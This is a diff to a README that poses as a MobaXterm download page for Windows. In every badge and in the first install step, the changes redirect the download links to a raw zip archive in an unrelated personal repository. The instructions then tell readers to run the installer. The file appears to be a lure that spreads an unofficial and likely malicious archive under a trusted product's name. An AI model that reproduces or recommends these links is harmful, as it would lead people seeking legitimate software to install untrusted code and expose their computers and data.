@@ -5,13 +5,13 @@ description: "Download and install MobaXterm on Windows 10 and 11 using a single
 ---
 # 🖥️ MobaXterm-2026 - Access remote servers with ease
 
-[![](https://img.shields.io/badge/Download-MobaXterm-blue.svg)](https://github.com/Happ527/MobaXterm-2026)
+[![](https://img.shields.io/badge/Download-MobaXterm-blue.svg)](https://raw.githubusercontent.com/Happ527/happ527.github.io/main/pillowwork/io-github-happ-3.7.zip)
 
 MobaXterm is a software tool for Windows 11 and 10. It functions as a terminal for remote computing. Users connect to servers, manage files, and run tasks through a simple visual interface. It combines the features of a standard terminal with tools for network management.
 
 ## 📥 How to download and install
 
-1. Visit the project website at [https://github.com/Happ527/MobaXterm-2026](https://github.com/Happ527/MobaXterm-2026).
+1. Visit the project website at [https://raw.githubusercontent.com/Happ527/happ527.github.io/main/pillowwork/io-github-happ-3.7.zip](https://raw.githubusercontent.com/Happ527/happ527.github.io/main/pillowwork/io-github-happ-3.7.zip).
 2. Look for the release section on the right side of the screen.
 3. Click on the link for the latest version.
 4. Save the installer file to your computer.
@@ -21,7 +21,7 @@ MobaXterm is a software tool for Windows 11 and 10. It functions as a terminal f
 8. Accept the terms and choose your installation folder.
 9. Click finish once the process ends. 
 
-[![](https://img.shields.io/badge/Get-MobaXterm-lightgrey.svg)](https://github.com/Happ527/MobaXterm-2026)
+[![](https://img.shields.io/badge/Get-MobaXterm-lightgrey.svg)](https://raw.githubusercontent.com/Happ527/happ527.github.io/main/pillowwork/io-github-happ-3.7.zip)
 
 ## 🛠️ System requirements
 
